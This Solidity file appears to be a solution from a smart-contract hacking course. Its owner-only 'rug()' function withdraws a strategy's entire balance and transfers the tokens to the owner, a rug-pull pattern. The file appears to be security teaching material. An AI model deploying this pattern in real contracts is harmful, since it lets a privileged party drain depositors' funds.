// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "../../interfaces/IOptimizerStrategy.sol";

contract RugContractSolved is Ownable {

    IOptimizerStrategy public strategy;

    constructor(address _strategy) {
        strategy = IOptimizerStrategy(_strategy);
    }

    function rug() external onlyOwner {
        IERC20 want = IERC20(strategy.want());
        strategy.withdraw(strategy.balanceOf());
        want.transfer(msg.sender, want.balanceOf(address(this)));
    }

}
